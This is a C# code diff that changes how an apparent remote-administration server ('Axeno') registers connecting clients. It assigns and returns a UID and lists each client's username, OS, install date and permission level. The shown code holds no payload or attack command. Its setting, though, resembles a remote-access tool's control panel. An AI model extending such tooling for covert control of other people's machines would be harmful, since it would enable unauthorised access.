@@ -6,6 +6,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows;
 
 namespace Axeno.Networking.Communication
 {
@@ -19,19 +20,26 @@ namespace Axeno.Networking.Communication
             string username = msgpck.ForcePathObject("Username").AsString;
             string os = msgpck.ForcePathObject("Operatingsystem").AsString;
             string version = msgpck.ForcePathObject("Version").AsString;
-            
+            string clientuid = msgpck.ForcePathObject("UID").AsString;
+            if(clientuid == "N/A")
+            {
+                clientuid = GetUID();
+                cli.Send(SendUID(clientuid));
+            }
             ClientsLV thisclient = new ClientsLV();
-            thisclient.uid = GetUID();
+            thisclient.uid = clientuid;
             thisclient.version = version;
             thisclient.groupName = group;
             thisclient.appLevel = permissions;
             thisclient.installDate = installdate;
             thisclient.clientName = username;
-            thisclient.Socket = cli.Socket;
+            thisclient.Client = cli;
             thisclient.operatingSystem = os;
             thisclient.ping = "N/A";
-            MainWindowSlides.lvClients.Items.Add(thisclient);
             cli.CurrentClient = thisclient;
+
+            MainWindowSlides.lvClients.Items.Add(thisclient);
+
         }
         private static Random random = new Random();
 
@@ -40,6 +48,13 @@ namespace Axeno.Networking.Communication
             const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
             return new string(Enumerable.Repeat(chars, 6)
                 .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
+        public byte[] SendUID(string uid)
+        {
+            MsgPack msgpack = new MsgPack();
+            msgpack.ForcePathObject("Packet").AsString = "ClientUID";
+            msgpack.ForcePathObject("UID").AsString = uid;
+            return msgpack.Encode2Bytes();
         }
     }
 }
